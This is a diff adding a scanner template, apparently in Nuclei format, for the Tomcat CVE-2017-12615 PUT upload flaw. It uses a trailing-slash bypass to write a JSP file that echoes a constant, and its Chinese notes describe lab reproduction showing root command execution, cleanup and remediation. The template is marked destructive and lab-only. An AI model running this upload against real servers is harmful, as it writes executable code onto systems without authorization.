@@ -1,0 +1,88 @@
+id: C2-TOMCAT-2017-12615-PUT-CONFIRM
+
+info:
+  name: Tomcat DefaultServlet PUT Upload (CVE-2017-12615) - DESTRUCTIVE, DISABLED BY DEFAULT
+  author: forge-detector
+  severity: critical
+  description: |
+    ╔══════════════════════════════════════════════════════════════════════╗
+    ║  ⚠️  破坏性模板 —— 默认不启用，team 红线要求人工授权后才可执行  ║
+    ╚══════════════════════════════════════════════════════════════════════╝
+
+    本模板**会上传一个 JSP 文件到目标服务器**（PUT 写操作）。
+    团队硬约束：「检测脚本只读、不写文件」。因此本模板：
+
+      - 打了 `destructive` tag
+      - metadata 写明默认关闭理由
+      - 文件名以 `-DISABLED-BY-DEFAULT` 语义标注（见下方 id 说明）
+
+    执行方式（**必须同时满足**才可运行）：
+      1. 目标属**你自己拥有或已获书面授权**的靶场
+      2. 目标仅绑 127.0.0.1 / localhost / 192.168.56.x
+      3. 显式加 `-include-tags destructive` 才会启用
+
+    ── 原理 ──
+    Tomcat 的 DefaultServlet 有 readonly 参数（默认 true = 拒 PUT）。本 CVE 的靶场
+    conf/web.xml 被显式改为 false。Servlet 映射只让 .jsp 走 JspServlet（禁 PUT），
+    所以**必须用尾部斜杠** `PUT /x.jsp/` 才能命中 DefaultServlet 的写路径。
+
+    ── ★ 尾部斜杠是绕过后缀白名单的必要条件 ★ ──
+    loop3 实测：去掉尾部斜杠 100% 失败。本模板 path 保留尾斜杠，不要改。
+    证据：security/learning/_evidence/loop3-t7-c2-tomcat-put-raw.txt
+
+    ── 实测数据（loop3）──
+      - `PUT /xxx.jsp/` → HTTP 201（首次实测曾回 204，也是成功；以第二轮到 201 为准）
+      - `GET /xxx.jsp`  → HTTP 200，回显 `uid=0(root) ... |bb18b6fe2e26|`
+      - 复现率：PUT 写 JSP 3/3；GET 执行回显 3/3（区间 ≥95%）
+      - 宿主侧首次 GET 曾 404（JSP 首次编译耗时），换新文件名重测即 200（N-C06）
+
+    ── ★ 清理警告 ★ ──
+    loop3 N-C04 实测：**HTTP DELETE 对已上传 JSP 返回 405**（.jsp 归 JspServlet，
+    HttpJspBase 无 doDelete）。→ 清理**不能**走 HTTP DELETE，必须进容器/服务器
+    手工 `rm` 该 JSP 文件。本模板不自动清理，因为那会引入新的写操作。
+
+  remediation: |
+    1) 升级 Tomcat 至 7.0.81 / 8.5.20 / 9.0.1
+    2) conf/web.xml 中 DefaultServlet 的 readonly 恢复为 true（或删掉该 init-param）
+    3) conf/Catalina/localhost/ROOT.xml 加 <Context><Parameter name="readonly" value="true"/></Context>
+    4) Tomcat 以非 root 运行；禁用 autoDeploy/unpackWARs
+  reference:
+    - security/learning/loop3-c-vulhub-report-t7-20261012.md
+    - security/learning/_evidence/loop3-t7-c2-tomcat-put-raw.txt
+    - security/learning/_evidence/loop3-t7-c2-cleanup-raw.txt
+  classification:
+    cve-id: CVE-2017-12615
+    cwe-id: CWE-434, CWE-732
+  metadata:
+    bounty-forge: loop4-t2
+    loop3-finding-id: C2-TOMCAT-2017-12615
+    destructive: "true"
+    default-enabled: "false"
+    default-disabled-reason: |
+      PUT 会把 JSP 文件写进目标 webapps 目录 = 写文件系统 + 可执行代码落地。
+      团队硬约束「检测脚本只读、不写文件」，故默认关闭，需 -include-tags destructive 显式启用。
+    http-methods: PUT
+    request-count: "1"
+    max-request-rate: "1/s"
+    trailing-slash-required: "true"
+    trailing-slash-reason: "PUT /x.jsp/ 的尾斜杠是绕过后缀白名单（.jsp→JspServlet 禁 PUT）的必要条件，去掉必失败"
+    cleanup-warning: "HTTP DELETE 对 .jsp 返回 405（N-C04），清理必须进容器手工 rm，本模板不自动清理"
+    jsp-payload: "<% out.print(\"BF-C2-READONLY-ONLY\"); %> —— 只回显常量，不执行任何命令、不写文件"
+    loop3-evidence: "PUT /xxx.jsp/ -> 201（首次实测曾回 204，也是成功）；随后 GET -> 200 回显 uid=0(root)|bb18b6fe2e26；3/3 写、3/3 执行（区间 >=95%）；DELETE .jsp -> 405（1/1）"
+
+http:
+  - method: PUT
+    path:
+      - "{{BaseURL}}/bf_c2_confirm.jsp/"
+    headers:
+      User-Agent: bounty-forge-detector/1.0 (authorized local lab)
+      Content-Type: application/octet-stream
+    body: "<% out.print(\"BF-C2-READONLY-ONLY\"); %>"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 201
+      - type: status
+        status:
+          - 204
